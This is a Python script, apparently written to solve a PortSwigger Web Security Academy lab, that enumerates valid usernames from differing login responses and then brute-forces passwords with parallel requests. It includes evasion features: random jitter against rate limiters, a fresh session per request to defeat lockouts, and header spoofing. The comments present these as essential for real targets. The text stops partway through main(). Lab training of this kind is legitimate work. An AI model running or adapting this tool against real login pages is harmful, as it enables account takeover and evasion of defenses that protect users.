#!/usr/bin/env python3
# Copyright (c) 2026 cyberprophetTV. Licensed under the MIT License (see LICENSE).
#
# FOR EDUCATIONAL USE ONLY.
# Intended for solving PortSwigger Web Security Academy labs and for
# use against systems you OWN or have EXPLICIT WRITTEN PERMISSION to
# test. Running this against unauthorized systems is illegal in most
# jurisdictions (CFAA in the US, Computer Misuse Act in the UK, etc).
# You are responsible for ensuring your use is lawful. See README.
"""
=====================================================================
Solver for PortSwigger lab:
  "Username enumeration via different responses"
  https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses
=====================================================================

WHY THIS LAB EXISTS / WHAT THE VULNERABILITY IS
------------------------------------------------
A well-designed login form returns the SAME error message whether the
username is wrong, the password is wrong, or both. That way an attacker
who guesses random usernames can't tell which ones are real accounts.

This lab does it WRONG: when you submit a valid username with a wrong
password, the server says "Incorrect password". When you submit an
invalid username, it says "Invalid username". The two responses differ
in body length AND in the error text.

Why that matters in the real world:
  - Attacker probes a candidate-username list with a junk password.
  - The server's response leaks which usernames exist on the system.
  - Now they brute-force just the real accounts instead of every
    combination - the search space drops by orders of magnitude.
  - Combined with a leaked password dump (credential stuffing), this
    is often enough to break in directly: tons of users reuse passwords
    across sites.

This vulnerability is called USERNAME ENUMERATION. It shows up in
login forms, "forgot password" forms, registration forms ("that email
is already taken"), and even timing-based attacks (valid users take
longer to respond because the server actually hashes the password,
while invalid users short-circuit).

WHAT THIS SCRIPT DOES
---------------------
Phase 1 - Username enumeration:
    For each candidate username, send POST /login with a long random
    junk password. Record (status code, body length, error message) as
    a "fingerprint" of the response. The valid username is the one
    whose fingerprint is UNIQUE among all responses.

Phase 2 - Password brute-force:
    With the valid username in hand, try each candidate password. The
    successful login is the one that returns HTTP 302 (redirect to
    /my-account) instead of HTTP 200 (an error page).

STEALTH FEATURES (--jitter)
---------------------------
"Stealth" in web pentesting means making your traffic harder to detect
and block. Real defenses to evade include:
  - Rate limiters (block after N requests in T seconds from same IP)
  - WAF pattern matchers (flag fast/regular traffic as automated)
  - Account lockouts (lock after N failed logins per account)
  - Anomaly detectors (flag traffic that doesn't match a browser)

This script implements --jitter: a random delay before each request.
That defeats simple "requests per second" rate limiters because no
two requests have a predictable spacing, and the overall rate dips
below most thresholds. Real evasion stacks more on top (rotating
User-Agents, proxies/Tor for IP rotation, randomizing request order,
browser-like header sets, JavaScript rendering for SPAs, etc.).

PortSwigger labs almost never block you on the server side - the
"rate limit" you experience with Burp Community is the Intruder UI's
client-side throttle, not the lab. So for THIS lab jitter is purely
educational. But the technique is essential for real targets.

SESSION MANAGEMENT (--fresh-session, --csrf, --show-cookies)
------------------------------------------------------------
HTTP is stateless. To remember who you are across requests, servers
hand the browser a SESSION COOKIE (e.g. `session=abc123`) on the
first request, and the browser sends it back on every subsequent
one. The server uses that cookie to look up your session state
(logged-in user, cart contents, failed-login counter, etc.).

Three session concepts matter for this kind of attack:

1. CONNECTION REUSE (HTTP keep-alive):
       A `requests.Session()` keeps TCP connections open and reuses
       them across requests. 5-10x faster than tearing down + rebuilding
       a connection (and a TLS handshake) every time.

2. PER-SESSION TRACKING:
       Some sites count failed login attempts PER SESSION COOKIE.
       Reuse the same session for 100 wrong passwords and you'll
       trip the counter. --fresh-session creates a brand new Session
       per request, defeating per-session tracking at the cost of
       slower handshakes.

3. CSRF TOKENS:
       Sites that protect against Cross-Site Request Forgery embed a
       random token in the login form HTML. The browser submits that
       token alongside the username + password. The server checks
       it. An automated tool needs to:
         a) GET /login to fetch the form
         b) Parse the CSRF token out of the HTML
         c) POST /login with username + password + token
       That's two requests per attempt instead of one. THIS lab has
       no CSRF on the login form, so --csrf is off by default. Enable
       it for other PortSwigger labs that DO use one (e.g. the CSRF
       and the "Username enumeration via subtly different responses"
       labs).

WHY NOT USE BURP INTRUDER?
--------------------------
Burp Suite's Intruder feature does exactly this kind of attack. The
Community (free) edition deliberately throttles it to ~1 request every
few seconds, so this lab would take ~10 minutes per phase. Burp Pro
removes the throttle but costs money.

The lab server itself does NOT rate-limit, so a Python script using
`requests` + a small thread pool finishes both phases in seconds.

BURP PROXY INTEGRATION (--proxy)
--------------------------------
Bypassing Intruder doesn't mean ignoring Burp entirely. A common
workflow is to RUN this script WHILE Burp is open, with all of the
script's traffic routed THROUGH Burp's proxy listener. Burp then
records every request + response in its HTTP History tab, where you
can:

  - Inspect exactly what your script sent (great for debugging)
  - Replay specific requests in Repeater
  - Send interesting responses to Comparer/Scanner for deeper analysis
  - Modify requests on the fly with Intercept

Pass `--proxy burp` (shorthand for http://127.0.0.1:8080, Burp's
default listener) to enable this routing. Or pass any other proxy
URL: `--proxy http://127.0.0.1:9000`, etc.

TLS NOTE: Burp performs a deliberate man-in-the-middle on HTTPS - it
presents your client with a server certificate signed by Burp's OWN
CA, not the real one. Python's `requests` will refuse this by default
because Burp's CA isn't in your system trust store. So when --proxy
is set, this script automatically disables TLS verification on its
own requests (`verify=False`). This is a SCRIPT-LOCAL relaxation and
does NOT modify your system trust store - other tools on your machine
still validate certs normally.

If you'd rather keep verification on, install Burp's CA into your
trust store (visit http://burp/cert while proxied to download it),
then pass --proxy without auto-disabling: see comments in build_session.

ABOUT PORTSWIGGER LABS
----------------------
PortSwigger's Web Security Academy is the standard free training
ground for web pentesting. Each lab spins up a real (disposable)
vulnerable web app on a unique subdomain like:
    https://0a1b00...XXXXXXXX.web-security-academy.net

Tips for working with the labs:
  - The lab container expires after ~20 minutes of inactivity. If
    every response is 504, click "Access the lab" again to spin up
    a fresh container with a (possibly new) URL.
  - Solving the lab marks it solved on your academy profile.
  - The lab pages list the CANDIDATE usernames/passwords - the
    "real" answer is always somewhere in those lists. Don't bother
    brute-forcing with rockyou.txt; use the official lists.
"""

# ---------------------------------------------------------------------
# IMPORTS
# ---------------------------------------------------------------------
# Standard-library modules (ship with Python, no install needed):
import argparse                              # parses CLI flags like --workers
import random                                # used for jitter (random delay)
import re                                    # regex - extracts error msg + CSRF token from HTML
import sys                                   # used for sys.exit() to bail with a nonzero exit code
import time                                  # used for time.sleep() in jitter
from collections import Counter              # counts how many times each unique value appears
import json                                  # for --output (write results summary as JSON)
import threading                             # threading.Lock for the "first verbose dump" race
from concurrent.futures import (             # high-level threading API
    ThreadPoolExecutor,                      # manages a pool of worker threads
    as_completed,                            # yields futures in the order they finish
)
from dataclasses import dataclass, field     # tidy config-object container
from pathlib import Path                     # nicer file-path object than raw strings
from urllib.parse import urlparse            # validates the user-supplied lab URL

# Third-party (install via:  pip install requests):
import requests                              # popular HTTP client library
import urllib3                               # `requests` ships with this - used to silence
                                             # the InsecureRequestWarning when we proxy through Burp
from requests.adapters import HTTPAdapter    # lets us tune the connection pool
from urllib3.util.retry import Retry         # auto-retry on connection errors / 5xx

# Color + progress helpers (see _common.py). Both gracefully degrade:
# colors auto-off when stdout isn't a TTY, progress bar is a no-op
# without tqdm installed.
from _common import (
    tag_info, tag_ok, tag_warn, tag_err,
    progress, bold,
)


# ---------------------------------------------------------------------
# REGEXES
# ---------------------------------------------------------------------
# Login error message - PortSwigger renders these in HTML like:
#     <p class=is-warning>Invalid username</p>
# (class=is-warning without quotes is valid HTML5 for simple attribute values.)
#
# Pattern breakdown:
#   <p\s+class=is-warning>   literal "<p", whitespace, then `class=is-warning>`
#   ([^<]+)                  capture group 1: one or more chars that are NOT `<`
#                            - i.e. the message text, stopping at `</p>`
#   </p>                     closing tag
ERROR_RE = re.compile(r"<p\s+class=is-warning>([^<]+)</p>", re.IGNORECASE)

# CSRF token - PortSwigger labs that protect against CSRF put a hidden
# input in the login form, e.g.:
#     <input required type="hidden" name="csrf" value="abc123...">
# Attribute order varies between sites (some put `value=` before `name=`),
# so we try both orderings via alternation.
CSRF_RE = re.compile(
    r'<input[^>]*\bname=["\']?csrf["\']?[^>]*\bvalue=["\']([^"\']+)["\']'
    r'|<input[^>]*\bvalue=["\']([^"\']+)["\'][^>]*\bname=["\']?csrf["\']?',
    re.IGNORECASE,
)


# ---------------------------------------------------------------------
# CONFIG OBJECT
# ---------------------------------------------------------------------
# Bundling all the per-attack settings into a dataclass keeps function
# signatures short and makes it trivial to add new options later.
# @dataclass auto-generates __init__, __repr__, and __eq__ for us.
@dataclass
class AttackConfig:
    base_url: str                       # the lab's https://...web-security-academy.net
    workers: int                        # how many concurrent requests
    jitter: tuple[float, float]         # (min, max) seconds of random delay before each request
    fresh_session: bool                 # if True, build a new Session for every probe
    use_csrf: bool                      # if True, fetch GET /login first to extract a CSRF token
    show_cookies: bool                  # if True, print Set-Cookie headers (debugging aid)
    dummy_password: str                 # the junk password used during Phase 1
    proxy: str | None                   # if set, route requests through this proxy URL (e.g. Burp)
    insecure: bool                      # if True, skip TLS verification (auto-on when proxy is set)
    retries: int                        # how many times to retry on connection errors / 5xx
    verbose: bool                       # if True, print every probe + dump the first one in full
    output: Path | None                 # if set, write a JSON summary to this file
    # Custom headers applied to every request (e.g. Authorization, X-Forwarded-For).
    # `field(default_factory=list)` is the way to give a dataclass a default that's
    # a mutable object - using `= []` directly would share one list across instances.
    extra_headers: list[tuple[str, str]] = field(default_factory=list)


# ---------------------------------------------------------------------
# SESSION + REQUEST HELPERS
# ---------------------------------------------------------------------
def build_session(
    workers: int,
    proxy: str | None = None,
    insecure: bool = False,
    retries: int = 0,
    extra_headers: list[tuple[str, str]] | None = None,
) -> requests.Session:
    """
    Build a requests.Session tuned for fast parallel use, optionally
    routed through an upstream proxy (e.g. Burp Suite).

    WHY USE A SESSION INSTEAD OF requests.post() EACH TIME?
        A Session keeps a pool of open TCP connections to the server.
        Each request reuses an existing connection instead of doing
        a fresh TCP+TLS handshake every time. For 100+ requests to
        the same host this is a 5-10x speedup.

    WHY TUNE THE HTTPAdapter POOL?
        urllib3 (which `requests` uses under the hood) defaults to
        a pool size of 10. If we have more worker threads than that,
        the extras log a warning and tear down + rebuild connections
        every time. Setting pool_maxsize == workers gives every
        thread its own persistent connection.

    The Session also automatically collects cookies the server sets
    via Set-Cookie headers and includes them on subsequent requests.
    That's the same behavior as a browser keeping you "logged in"
    across page loads.

    PROXY HANDLING (Burp Suite integration):
        When `proxy` is given, every request the Session makes goes
        to that proxy first, which forwards it to the real target
        and forwards the response back. Burp records both directions
        in its History tab as it sees them.

    TLS HANDLING (when insecure=True):
        Burp does a deliberate man-in-the-middle on HTTPS - it replies
        with a server certificate signed by Burp's own CA. Python's
        `requests` will reject that cert because Burp's CA isn't in
        the system trust store, causing every request to fail. Setting
        `s.verify = False` tells `requests` to skip cert validation
        for this Session only. This is safe in a lab/pentest context
        where you control both ends; do NOT use verify=False against
        real production targets without proxying through Burp or
        equivalent, because it disables a key TLS guarantee.
    """
    s = requests.Session()

    # ---- Retry policy (when retries > 0) ----
    # urllib3.Retry plugs into HTTPAdapter and automatically retries
    # on the conditions you list. We use it for:
    #   - connection errors (ConnectionError, DNS failure, reset)
    #   - 502 / 503 / 504 (transient infra errors)
    # `backoff_factor=0.5` means exponentially increasing waits between
    # attempts: ~0s, 1s, 2s, 4s, ...
    # `allowed_methods` includes POST because in this attack context
    # we WANT POSTs retried on transient failure (login is idempotent
    # from the attacker's perspective - we just want the response).
    # `raise_on_status=False` lets us see the final 5xx instead of
    # raising an exception on it.
    retry = Retry(
        total=retries,
        backoff_factor=0.5,
        status_forcelist=[502, 503, 504],
        allowed_methods=["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"],
        raise_on_status=False,
    )

    # pool_connections = how many distinct hostname pools we keep
    # pool_maxsize    = max simultaneous connections per host pool
    # We size both to `workers` so the pool exactly matches concurrency.
    adapter = HTTPAdapter(
        pool_connections=workers,
        pool_maxsize=workers,
        max_retries=retry,
    )
    s.mount("http://", adapter)     # apply to all http:// URLs
    s.mount("https://", adapter)    # apply to all https:// URLs

    # Custom User-Agent makes our traffic identifiable in any logs.
    # PortSwigger labs don't care, but it's good hygiene - we're not
    # pretending to be a browser. On a real engagement you might
    # mimic a browser UA to blend in, OR set a clearly identifiable
    # one for authorized testing so blue teams can tell your traffic
    # apart from real attackers.
    s.headers.update({"User-Agent": "portswigger-lab-solver/1.0"})

    # Apply any custom headers the user passed via -H. These go on the
    # Session, so they're included on every request automatically
    # (including the GET in the CSRF flow). Later .update() calls win
    # over earlier ones, so a user-supplied User-Agent overrides our
    # default - which is what they probably wanted.
    if extra_headers:
        for name, val in extra_headers:
            s.headers[name] = val

    # ---- proxy + TLS configuration ----
    if proxy:
        # `requests` accepts a dict mapping scheme -> proxy URL.
        # We set the same proxy for BOTH http and https because Burp's
        # listener handles both schemes (it speaks HTTP to us and
        # forwards either plain HTTP or HTTPS to the target).
        s.proxies = {"http": proxy, "https": proxy}

    if insecure:
        # Skip TLS certificate validation. Required when proxying
        # through Burp unless you've installed Burp's CA into your
        # trust store. Don't use against real targets that you ISN'T
        # routing through a deliberate MITM proxy - it removes a key
        # part of TLS security.
        #
        # TO USE BURP'S CA INSTEAD (proper way):
        #   1. With Burp running and proxying, visit http://burp/cert
        #      in your browser to download `cacert.der`
        #   2. Convert: openssl x509 -inform DER -in cacert.der \
        #               -out burp-ca.pem
        #   3. Replace this line with: s.verify = "/path/to/burp-ca.pem"
        s.verify = False

    return s


def get_session(cfg: AttackConfig, shared: requests.Session | None) -> requests.Session:
    """
    Returns either the shared Session (for connection-reuse speed) or
    a brand-new one (to defeat per-session tracking).

    --fresh-session is the trade-off:
      * NORMAL (shared):       fast - connection + cookies reused
      * --fresh-session (new): slower (new TCP+TLS handshake each
                               time) but the server sees us as a
                               brand new client every request, so
                               any per-session counter resets.
    """
    if cfg.fresh_session:
        # Pool of 1 connection per session is plenty - this Session
        # is going to be used for exactly one request and then
        # garbage-collected. We still forward proxy + insecure so
        # fresh sessions also route through Burp if configured.
        return build_session(
            workers=1, proxy=cfg.proxy, insecure=cfg.insecure,
            retries=cfg.retries, extra_headers=cfg.extra_headers,
        )
    return shared


def maybe_jitter(cfg: AttackConfig) -> None:
    """
    Sleep for a random duration between cfg.jitter[0] and cfg.jitter[1]
    seconds. No-op if jitter wasn't configured (both 0).

    WHY RANDOM, NOT FIXED?
        A fixed delay still has a perfectly predictable rhythm. A
        smart rate limiter can detect "exactly 0.5s between every
        request" as easily as "no delay between requests". A random
        delay over a wider window looks more like organic traffic.

    INTERACTION WITH --workers:
        Jitter is per-request, but with parallel workers the EFFECTIVE
        request rate is approximately (workers / avg_jitter). E.g.
        --workers 10 --jitter 1-2 averages ~6.7 requests/second
        overall. To slow down further, drop the worker count.
    """
    lo, hi = cfg.jitter
    if hi > 0:
        # random.uniform returns a float in [lo, hi].
        time.sleep(random.uniform(lo, hi))


def post_login(session: requests.Session, cfg: AttackConfig,
               username: str, password: str) -> requests.Response:
    """
    Send a login attempt. Handles both the no-CSRF and CSRF flows.

    KEY DETAIL #1: allow_redirects=False
        On a SUCCESSFUL login the server returns HTTP 302 with a
        `Location: /my-account` header. By default `requests` will
        AUTOMATICALLY follow that redirect, fetch /my-account, and
        hand us a 200 OK response. That would hide our success signal -
        both successful and failed logins would look like status 200.
        Setting allow_redirects=False gives us the raw 302 so we can
        actually detect success.

    KEY DETAIL #2: timeout=20
        Without an explicit timeout, a hung request can block a worker
        thread forever. 20s is generous for a lab; lower it if you
        want faster failure when the lab session has died.

    KEY DETAIL #3: CSRF flow (when cfg.use_csrf is True)
        Many sites generate a one-time random "CSRF token" per form
        load, embed it as a hidden <input>, and reject any POST whose
        token doesn't match the one stored in the session. To handle
        that we:
          1. GET /login - server returns the form HTML + sets a
             session cookie tying us to a session.
          2. Extract the token from the HTML.
          3. POST /login with username + password + the same token.
             The Session automatically sends back the session cookie
             from step 1, so the server can match the token.
        Each attempt now costs TWO requests instead of one. With
        parallel workers this can also race - if two workers do GET
        at nearly the same time, the second's GET may invalidate the
        first's token. --fresh-session sidesteps that by giving each
        attempt its own session.
    """
    if cfg.use_csrf:
        g = session.get(f"{cfg.base_url}/login", timeout=20)
        csrf_match = CSRF_RE.search(g.text)
        # Either group 1 or group 2 matched (the two attribute orders);
        # the `or ""` falls back to empty if neither did.
        token = (csrf_match.group(1) or csrf_match.group(2)) if csrf_match else ""

        return session.post(
            f"{cfg.base_url}/login",
            # The 3rd field (csrf) is what the server validates against
            # the per-session expected token.
            data={"username": username, "password": password, "csrf": token},
            allow_redirects=False,
            timeout=20,
        )

    # No-CSRF path: single POST, no GET first.
    return session.post(
        f"{cfg.base_url}/login",
        # `data=` sends form-encoded body (application/x-www-form-urlencoded).
        # That's what HTML forms submit by default.
        data={"username": username, "password": password},
        allow_redirects=False,
        timeout=20,
    )


def extract_error(html: str) -> str:
    """
    Pull the error message text out of a login response.

    Returns "Invalid username", "Incorrect password", or "" if nothing
    matched (e.g. for a 302 redirect or a 504 timeout page).

    Empty-string fallback is important: even responses without an error
    block still get a consistent fingerprint, instead of crashing or
    producing garbage.
    """
    m = ERROR_RE.search(html)
    return m.group(1).strip() if m else ""


def maybe_log_cookies(cfg: AttackConfig, label: str, r: requests.Response) -> None:
    """
    If --show-cookies was passed, print the Set-Cookie header(s) the
    server returned for this request. Handy for understanding how the
    site tracks state (or for spotting session rotation).

    `r.cookies` is the Session's view of cookies set by THIS response,
    not all cookies in the jar.
    """
    if cfg.show_cookies and r.cookies:
        print(f"[cookies] {label}: {dict(r.cookies)}")


def read_wordlist(path: Path) -> list[str]:
    """
    Load a wordlist: one entry per line. Trim whitespace, drop blanks.

    The nested comprehension is equivalent to:
        result = []
        for line in path.read_text().splitlines():
            word = line.strip()
            if word:                # skip blank lines
                result.append(word)
        return result
    """
    return [w for w in (line.strip() for line in path.read_text().splitlines()) if w]


# =====================================================================
# PHASE 1: USERNAME ENUMERATION
# =====================================================================
def enumerate_username(cfg: AttackConfig, usernames: list[str]) -> str | None:
    """
    Find a valid username by probing every candidate with a junk
    password and looking for the response that DIFFERS from all the
    others.

    The Counter-based outlier detection is the heart of the attack.
    """
    print(f"{tag_info()} phase 1: probing {len(usernames)} usernames "
          f"with {cfg.workers} workers"
          + (f" (jitter {cfg.jitter[0]}-{cfg.jitter[1]}s)" if cfg.jitter[1] > 0 else "")
          + (" (CSRF on)" if cfg.use_csrf else "")
          + (" (fresh session per request)" if cfg.fresh_session else ""))

    # If we're sharing a Session across all workers, build it once.
    # If --fresh-session is set, each probe builds its own and `shared`
    # is None.
    shared = None if cfg.fresh_session else build_session(
        cfg.workers, cfg.proxy, cfg.insecure,
        retries=cfg.retries, extra_headers=cfg.extra_headers,
    )

    # `results` maps each username to its response fingerprint:
    #   {
    #     "carlos": (200, 3168, "Invalid username"),
    #     "admin":  (200, 3170, "Incorrect password"),  <-- the valid one
    #     ...
    #   }
    results: dict[str, tuple[int, int, str]] = {}

    def probe(u: str):
        """
        Run by each worker thread. Sends one login attempt and
        returns (username, status, body_length, error_msg, body).

        Defined INSIDE enumerate_username so it has automatic access
        to `cfg` and `shared` via closure. We carry the raw body
        back too - it's only needed for --verbose first-dump, but
        passing it through is harmless (each response is ~3 KB).
        """
        maybe_jitter(cfg)                          # stealth delay (if any)
        sess = get_session(cfg, shared)            # shared or brand-new
        r = post_login(sess, cfg, u, cfg.dummy_password)
        maybe_log_cookies(cfg, u, r)
        # len(r.content) counts BYTES of the raw response body. We use
        # raw bytes (not characters) because that's what server-side
        # response-length comparisons are typically done on.
        return u, r.status_code, len(r.content), extract_error(r.text), r.text

    # `first_dumped` tracks whether we've already shown the full
    # response of the first probe in verbose mode. Read/written only
    # from the MAIN thread (the as_completed loop), so no lock needed.
    first_dumped = False

    # ThreadPoolExecutor manages a pool of cfg.workers threads.
    # The `with` block ensures threads are joined + cleaned up on exit.
    with ThreadPoolExecutor(max_workers=cfg.workers) as ex:
        # Pattern:
        #   1. [ex.submit(probe, u) for u in usernames]
        #         submits one task per username; returns a Future per
        #         submission. The pool starts running them in parallel.
        #   2. as_completed(...) yields each Future as it FINISHES
        #         (in completion order, not submission order - depends
        #         on network timing + jitter).
        #   3. fut.result() unwraps the return value of probe()
        #         (or re-raises any exception probe() threw).
        futures = [ex.submit(probe, u) for u in usernames]
        for fut in progress(as_completed(futures), total=len(futures), desc="usernames"):
            u, status, length, msg, body = fut.result()
            results[u] = (status, length, msg)

            if cfg.verbose:
                print(f"    probe {u!r}: status={status} len={length} msg={msg!r}")
                if not first_dumped:
                    # First response gets a full body dump so the user can
                    # eyeball it and confirm the script is talking to the
                    # right lab and parsing the right HTML.
                    print(f"    --- first probe body (truncated to 2 KB) ---")
                    print("    " + body[:2000].replace("\n", "\n    "))
                    print("    --- end of first probe body ---")
                    first_dumped = True

    # -----------------------------------------------------------------
    # OUTLIER DETECTION
    # -----------------------------------------------------------------
    # Count how many usernames share each unique fingerprint.
    # Counter is a dict subclass; this produces something like:
    #   {
    #     (200, 3168, "Invalid username"):   100,   <-- baseline (invalid)
    #     (200, 3170, "Incorrect password"): 1,     <-- our outlier (valid)
    #   }
    counts = Counter(results.values())

    # The valid username is the one whose fingerprint appears EXACTLY
    # ONCE. The 100 invalid usernames all share the same "Invalid
    # username" fingerprint, so their count is 100.
    unique = [fp for fp, c in counts.items() if c == 1]

    # ---- FAILURE MODE 1: no outlier found ----
    # Every response fingerprint appeared multiple times. Usually means:
    #   - Lab session expired (504 Gateway Timeout for every request)
    #   - Wrong URL (404 for every request)
    #   - Server returning a generic error page regardless of input
    if not unique:
        print(f"{tag_err()} no outlier found - every response looked identical.")
        for u, fp in list(results.items())[:3]:
            print(f"    sample: {u!r} -> {fp}")
        return None

    # ---- FAILURE MODE 2: multiple unique fingerprints ----
    # If MORE than one fingerprint appears once, the server is producing
    # per-request variation - e.g. a CSRF token in the HTML that's
    # regenerated every response, making every body length slightly
    # different. To handle that you'd need to strip the dynamic parts
    # from the body before fingerprinting (or compare by error MESSAGE
    # only, not length).
    if len(unique) > 1:
        print(f"{tag_warn()} {len(unique)} outliers - server may be noisy. Candidates:")
        for fp in unique:
            for u, r in results.items():
                if r == fp:
                    print(f"    {u!r}  fingerprint={fp}")
        return None

    # ---- SUCCESS PATH ----
    fingerprint = unique[0]
    # next(...) returns the first item from the generator expression.
    valid = next(u for u, r in results.items() if r == fingerprint)

    # counts.most_common(1) returns the single most-common fingerprint -
    # i.e. what "invalid username" responses look like. We print it as
    # the baseline so the user can see what we keyed on.
    baseline = counts.most_common(1)[0][0]
    print(f"{tag_ok()} valid username: {valid!r}")
    print(f"    outlier  : status={fingerprint[0]} len={fingerprint[1]} msg={fingerprint[2]!r}")
    print(f"    baseline : status={baseline[0]}  len={baseline[1]}  msg={baseline[2]!r}")
    return valid


# =====================================================================
# PHASE 2: PASSWORD BRUTE-FORCE
# =====================================================================
def brute_password(cfg: AttackConfig, username: str, passwords: list[str]) -> str | None:
    """
    Given a valid username, try each candidate password until the
    server returns HTTP 302 (success - redirect to /my-account).

    Stops as soon as the password is found instead of waiting for
    every probe to finish.
    """
    print(f"{tag_info()} phase 2: trying {len(passwords)} passwords against {username!r}")
    shared = None if cfg.fresh_session else build_session(
        cfg.workers, cfg.proxy, cfg.insecure,
        retries=cfg.retries, extra_headers=cfg.extra_headers,
    )
    found: str | None = None

    def probe(p: str):
        maybe_jitter(cfg)
        sess = get_session(cfg, shared)
        r = post_login(sess, cfg, username, p)
        maybe_log_cookies(cfg, p, r)
        return p, r.status_code, r.headers.get("Location", "")

    with ThreadPoolExecutor(max_workers=cfg.workers) as ex:
        # {Future: password} dict so we can iterate to .cancel() later.
        futures = {ex.submit(probe, p): p for p in passwords}

        for fut in progress(as_completed(futures), total=len(futures), desc="passwords"):
            p, status, location = fut.result()

            if cfg.verbose:
                print(f"    probe pw={p!r}: status={status}")

            # HTTP 302 = redirect = successful login. The server is
            # sending us to /my-account (or whatever the Location
            # header says).
            if status == 302:
                found = p
                print(f"{tag_ok()} password found: {p!r}  -> redirect to {location!r}")

                # Cancel queued probes so we don't keep hammering
                # the server after we've won.
                # NOTE: .cancel() only stops futures that haven't
                # STARTED yet. Requests already in-flight will still
                # finish; we just don't read their results.
                for f in futures:
                    f.cancel()
                break

    return found


# =====================================================================
# ARGUMENT PARSING HELPERS
# =====================================================================
def parse_jitter(s: str) -> tuple[float, float]:
    """
    Parse a --jitter value into (min, max) seconds.

    Accepts:
        "0"          -> (0.0, 0.0)   - jitter disabled
        "0.5"        -> (0.5, 0.5)   - fixed 0.5s delay (no randomness)
        "0.5-2.0"    -> (0.5, 2.0)   - random delay in [0.5s, 2.0s]
    """
    if "-" in s:
        lo, hi = s.split("-", 1)
        return float(lo), float(hi)
    v = float(s)
    return v, v


# =====================================================================
# CLI ENTRYPOINT
# =====================================================================
def main():
    """
    Parse arguments, run Phase 1, run Phase 2, print credentials.
    """
    # argparse turns this docstring + the add_argument() calls below
    # into a proper --help message AND validates the user's CLI input.
    ap = argparse.ArgumentParser(
        description=__doc__,
        # Preserve the multi-line layout of our module docstring.
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    # ---- Positional args (required, in order) ----
    ap.add_argument("base_url",
                    help="Lab base URL, e.g. https://0a1b...web-security-academy.net")
    ap.add_argument("usernames", type=Path,
                    help="Path to username wordlist")
    ap.add_argument("passwords", type=Path,
                    help="Path to password wordlist")

    # ---- Tuning ----
    ap.add_argument("--workers", type=int, default=10,
                    help="Concurrent requests (default 10). "
                         "Higher = faster but more conspicuous.")
    ap.add_argument(
        "--dummy-password",
        # Long random string so it can't accidentally collide with a
        # real password during Phase 1.
        default="not-a-real-password-xkcd-correct-horse-battery-staple-2026",
        help="Password used during the username-probing phase",
    )

    # ---- Stealth ----
    ap.add_argument(
        "--jitter",
        type=parse_jitter,
        default=(0.0, 0.0),
        metavar="MIN-MAX",
        help="Random delay (seconds) before each request. "
             "Examples: '0.5' = fixed 0.5s. '0.5-2.0' = random in [0.5, 2.0]. "
             "Default: no delay. Combine with --workers 1 for max stealth.",
    )

    # ---- Session management ----
    ap.add_argument(
        "--fresh-session",
        action="store_true",
        help="Use a brand new Session (cookie jar + connections) for "
             "every request. Defeats per-session lockouts and tracking. "
             "Slower because each request does a fresh TCP+TLS handshake.",
    )
    ap.add_argument(
        "--csrf",
        action="store_true",
        help="Two-step request flow: GET /login first to extract a "
             "CSRF token, then POST with the token included. Needed "
             "for labs that protect the login form against CSRF. Not "
             "required for THIS lab.",
    )
    ap.add_argument(
        "--show-cookies",
        action="store_true",
        help="Print Set-Cookie headers returned by the server. "
             "Useful for understanding how the site tracks session state.",
    )

    # ---- Burp / proxy integration ----
    ap.add_argument(
        "--proxy",
        metavar="URL",
        help="Route every request through an HTTP proxy. Pass 'burp' as "
             "shorthand for http://127.0.0.1:8080 (Burp's default listener). "
             "Auto-enables --insecure because Burp re-signs TLS certs with "
             "its own CA. You can pass any proxy URL; if you omit the "
             "scheme, http:// is assumed.",
    )
    ap.add_argument(
        "--insecure",
        action="store_true",
        help="Skip TLS certificate verification. Auto-enabled by --proxy. "
             "Only safe in lab / authorized-test contexts where you control "
             "(or trust) the upstream proxy.",
    )

    # ---- Reliability + observability (Tier 2) ----
    ap.add_argument(
        "-H", "--header",
        action="append",
        default=[],
        metavar="NAME:VALUE",
        help="Extra header sent on every request (repeatable). Examples: "
             "-H 'Authorization: Bearer eyJ...' "
             "-H 'X-Forwarded-For: 127.0.0.1'",
    )
    ap.add_argument(
        "--verbose",
        action="store_true",
        help="Print every probe (not just the final result) and dump the "
             "first probe's full response body so you can sanity-check "
             "the lab is responding as expected.",
    )
    ap.add_argument(
        "--retries",
        type=int,
        default=2,
        help="Retry count on connection errors / transient 5xx responses "
             "(default 2). Set to 0 to disable retries.",
    )
    ap.add_argument(
        "--output",
        type=Path,
        metavar="FILE.json",
        help="Write a JSON summary (lab URL, username fingerprints, valid "
             "username, password, final credentials) to this file.",
    )

    args = ap.parse_args()

    # ---- Parse -H / --header arguments into (name, value) pairs ----
    # `requests` is tolerant of bad header values but we still split on
    # the first colon so a value containing ':' (e.g. a Bearer token
    # with timestamps) isn't truncated.
    extra_headers: list[tuple[str, str]] = []
    for raw in args.header:
        if ":" not in raw:
            sys.exit(f"--header must look like 'Name: Value', got {raw!r}")
        name, val = raw.split(":", 1)
        extra_headers.append((name.strip(), val.strip()))

    # ---- Resolve proxy shorthand + auto-enable insecure ----
    # `--proxy burp` -> the default Burp listener address.
    # Any proxy without a scheme -> assume plain http:// to it.
    proxy = args.proxy
    insecure = args.insecure
    if proxy:
        if proxy.strip().lower() == "burp":
            proxy = "http://127.0.0.1:8080"
        elif "://" not in proxy:
            # Tolerate things like `--proxy 127.0.0.1:8080`.
            proxy = f"http://{proxy}"

        # Auto-enable TLS bypass: Burp / mitmproxy / any intercepting
        # proxy will present its OWN CA, which Python won't trust.
        insecure = True

        print(f"{tag_info()} routing through proxy: {proxy} (TLS verification disabled)")

    if insecure:
        # Silence the noisy "InsecureRequestWarning: Unverified HTTPS
        # request is being made" that urllib3 prints to stderr for
        # every request when verify=False. This is process-wide and
        # only takes effect when we explicitly asked for insecure.
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # ---- URL normalization ----
    # Accept whatever the user pasted (with a path, query string, etc.)
    # and strip it down to scheme + host only.
    parsed = urlparse(args.base_url)
    if not parsed.scheme or not parsed.netloc:
        sys.exit("base_url must include scheme + host, e.g. https://0a1b...web-security-academy.net")
    base = f"{parsed.scheme}://{parsed.netloc}"

    # ---- Bundle CLI args into a single config object ----
    cfg = AttackConfig(
        base_url=base,
        workers=args.workers,
        jitter=args.jitter,
        fresh_session=args.fresh_session,
        use_csrf=args.csrf,
        show_cookies=args.show_cookies,
        dummy_password=args.dummy_password,
        proxy=proxy,
        insecure=insecure,
        retries=args.retries,
        verbose=args.verbose,
        output=args.output,
        extra_headers=extra_headers,
    )

    # ---- Load wordlists from disk ----
